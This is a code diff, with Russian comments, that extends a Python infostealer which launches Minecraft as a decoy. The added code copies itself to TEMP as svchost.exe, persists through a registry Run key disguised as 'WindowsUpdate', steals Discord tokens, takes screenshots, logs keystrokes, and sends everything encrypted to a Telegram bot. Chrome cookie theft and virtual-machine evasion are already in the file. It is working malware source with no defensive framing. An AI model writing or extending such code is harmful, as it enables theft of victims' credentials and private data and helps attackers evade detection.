@@ -15,6 +15,11 @@ import random
 from datetime import datetime
 import logging
 from pathlib import Path
+from cryptography.fernet import Fernet
+import pyautogui
+import keyboard
+import winreg
+import glob
 
 # Настройки
 MINECRAFT_PATH = "C:\\Program Files (x86)\\Minecraft Launcher\\MinecraftLauncher.exe"
@@ -23,6 +28,8 @@ TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
 LOG_DIR = "logs"
 LOG_FILE = os.path.join(LOG_DIR, f"stealer_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
 TEMP_DIR = "temp_stealer_data"
+ENCRYPTION_KEY = Fernet.generate_key()
+CIPHER = Fernet(ENCRYPTION_KEY)
 
 # Настройка логирования
 if not os.path.exists(LOG_DIR):
@@ -37,15 +44,41 @@ def is_vm():
         if process.info['name'].lower() in suspicious_processes:
             logging.warning("Обнаружена виртуальная машина, завершаю работу!")
             return True
-    if psutil.cpu_count() <= 2:  # Часто в ВМ мало ядер
+    if psutil.cpu_count() <= 2:
         logging.warning("Слишком мало ядер процессора, возможно ВМ!")
         return True
     return False
 
+# Маскировка: переименовываем процесс
+def mask_process():
+    try:
+        # Копируем скрипт под видом системного процесса
+        fake_path = os.path.join(os.environ["TEMP"], "svchost.exe")
+        shutil.copyfile(__file__, fake_path)
+        subprocess.Popen(fake_path, creationflags=subprocess.DETACHED_PROCESS)
+        logging.info("Процесс замаскирован под svchost.exe")
+    except Exception as e:
+        logging.error(f"Ошибка маскировки: {str(e)}")
+
+# Автозапуск
+def add_to_startup():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f"\"{os.path.abspath(__file__)}\"")
+        winreg.CloseKey(key)
+        logging.info("Добавлен в автозапуск")
+    except Exception as e:
+        logging.error(f"Ошибка автозапуска: {str(e)}")
+
+# Функция для шифрования данных
+def encrypt_data(data):
+    return CIPHER.encrypt(data.encode()).decode()
+
 # Функция для отправки данных в Telegram
 def send_to_telegram(message, file_path=None):
+    encrypted_message = encrypt_data(message)
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    data = {"chat_id": TELEGRAM_CHAT_ID, "text": encrypted_message}
     requests.post(url, data=data)
     if file_path:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
@@ -119,8 +152,55 @@ def steal_chrome_cookies():
         logging.error(f"Ошибка при краже cookies: {str(e)}")
         return f"Ошибка при краже cookies: {str(e)}"
 
+# Функция для кражи токенов Discord
+def steal_discord_tokens():
+    try:
+        discord_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "discord", "Local Storage", "leveldb")
+        if not os.path.exists(discord_path):
+            return "Discord не установлен"
+        
+        tokens = []
+        for file_name in glob.glob(os.path.join(discord_path, "*.ldb")):
+            with open(file_name, "r", errors="ignore") as file:
+                content = file.read()
+                if "token" in content:
+                    for line in content.split():
+                        if "token" in line:
+                            token = line.split('"token":"')[1].split('"')[0]
+                            tokens.append(token)
+                            break
+        
+        logging.info(f"Украдено {len(tokens)} токенов Discord")
+        return "\n".join(tokens) if tokens else "Токены Discord не найдены"
+    except Exception as e:
+        logging.error(f"Ошибка при краже токенов Discord: {str(e)}")
+        return f"Ошибка при краже токенов: {str(e)}"
+
+# Функция для создания скриншота
+def take_screenshot():
+    screenshot_path = os.path.join(TEMP_DIR, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+    pyautogui.screenshot().save(screenshot_path)
+    logging.info("Скриншот сделан")
+    return screenshot_path
+
+# Функция для записи нажатий клавиш (keylogger)
+def keylogger():
+    log_file = os.path.join(TEMP_DIR, "keylog.txt")
+    with open(log_file, "a") as f:
+        def on_press(key):
+            try:
+                f.write(str(key) + "\n")
+                f.flush()
+            except:
+                pass
+        keyboard.on_press(on_press)
+        time.sleep(60)  # Логируем 60 секунд
+        keyboard.unhook_all()
+    logging.info("Запись клавиш завершена")
+    return log_file
+
 # Функция для поиска и кражи файлов
-def steal_files(extensions=[".txt", ".png", ".jpg"]):
+def steal_files(extensions=[".txt", ".png", ".jpg", ".pdf"]):
     desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
     documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
     paths = [desktop_path, documents_path]
@@ -170,6 +250,10 @@ def main():
         send_to_telegram("🚨 Обнаружена виртуальная машина, завершаю работу!")
         return
 
+    # Маскировка и автозапуск
+    mask_process()
+    add_to_startup()
+
     # Запускаем Minecraft для маскировки
     launch_minecraft()
     while not is_minecraft_running():
@@ -198,6 +282,24 @@ def main():
         cookies = steal_chrome_cookies()
         send_to_telegram("🍪 Cookies из Chrome:\n" + cookies)
     threads.append(threading.Thread(target=send_cookies))
+
+    # Кража токенов Discord
+    def send_discord_tokens():
+        tokens = steal_discord_tokens()
+        send_to_telegram("🎮 Токены Discord:\n" + tokens)
+    threads.append(threading.Thread(target=send_discord_tokens))
+
+    # Скриншот
+    def send_screenshot():
+        screenshot = take_screenshot()
+        send_to_telegram("🖼️ Скриншот экрана:", file_path=screenshot)
+    threads.append(threading.Thread(target=send_screenshot))
+
+    # Keylogger
+    def send_keylog():
+        keylog_file = keylogger()
+        send_to_telegram("⌨️ Лог клавиш:", file_path=keylog_file)
+    threads.append(threading.Thread(target=send_keylog))
 
     # Кража файлов
     def send_files():
